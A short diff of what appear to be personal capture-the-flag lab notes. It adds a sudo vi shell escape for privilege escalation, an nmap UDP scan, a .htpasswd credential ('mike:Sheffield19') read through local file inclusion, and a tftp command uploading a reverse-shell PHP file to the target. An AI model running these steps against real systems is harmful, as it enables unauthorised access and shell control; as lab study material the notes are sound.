@@ -73,4 +73,9 @@ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf :set shell=/bin/sh
 
 * To scan for UDP ports with nmap write the following `sudo nmap -Pn -sV -sU 10.129.126.250 `
 
+* `.htpasswd` this file is used for basic HTTP authentication.
+* The local file inclusion vul in the http service allowed me to access the `.htpasswd` file which, it seems, contains usernames and password. Indeed, it did contain the username and password of a user named Mike. I'll try and ssh with them. Damn just remembered there's no ssh on the host.
+mike:Sheffield19
 
+
+tftp 10.129.132.172 -m binary -c put revShell.php revShell.php
